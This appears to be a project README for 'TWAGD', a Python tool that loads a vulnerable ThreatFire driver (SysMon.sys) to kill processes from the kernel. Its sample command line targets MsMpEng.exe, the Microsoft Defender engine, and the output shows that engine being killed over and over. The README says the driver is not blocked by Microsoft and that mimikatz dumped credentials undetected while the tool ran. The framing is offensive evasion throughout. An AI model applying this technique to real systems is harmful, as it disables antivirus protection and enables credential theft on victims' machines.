# TWAGD
Today Was A Good Day is a BYOVD exploit that uses Python to evade detection 

TWAGD uses the vulnerable TfSysMon driver from ThreatFire System Monitor (2013) caleld SysMon.sys to either singularly or perpetually terminate a process from the kernel. The script is written in Python to bypass standard executable detection mechanisms. 

As of 2/21/2025 the SysMon.sys driver is not blocked by Microsoft. 

Below is an output of the CLI when the script is executed. 

```
python .\twagd_constant.py MsMpEng.exe
[!] Installing and starting the driver...
[SC] CreateService FAILED 1072:
The specified service has been marked for deletion.
[!] Driver service created successfully.
[SC] StartService FAILED 1058:
The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
[!] Driver started successfully.
[!] Monitoring process for termination. Press Enter to stop.
[!] Press Enter to stop monitoring and remove the driver...
[!] Killing process with PID: 3932
[!] Process with PID 3932 termination requested via driver.
[!] Killing process with PID: 7084
[!] Process with PID 7084 termination requested via driver.
[!] Killing process with PID: 9836
[!] Process with PID 9836 termination requested via driver.
[!] Killing process with PID: 9732
[!] Process with PID 9732 termination requested via driver.
[!] Killing process with PID: 7504
[!] Process with PID 7504 termination requested via driver.
[!] Killing process with PID: 11292
[!] Process with PID 11292 termination requested via driver.
[!] Killing process with PID: 4428
[!] Process with PID 4428 termination requested via driver.
[!] Killing process with PID: 1788
[!] Process with PID 1788 termination requested via driver.
[!] Stopping and removing the driver...
[SC] ControlService FAILED 1052:
The requested control is not valid for this service.
[SC] DeleteService FAILED 1072:
The specified service has been marked for deletion.
[!] Driver service deleted successfully.
```

During this execution, mimikatz.exe was dropped on disk, executed, and dumped credentials from memory without detection. On termination of the script, mimikatz.exe was still not detected until the next scan or if you tried to execute it while on disk. 

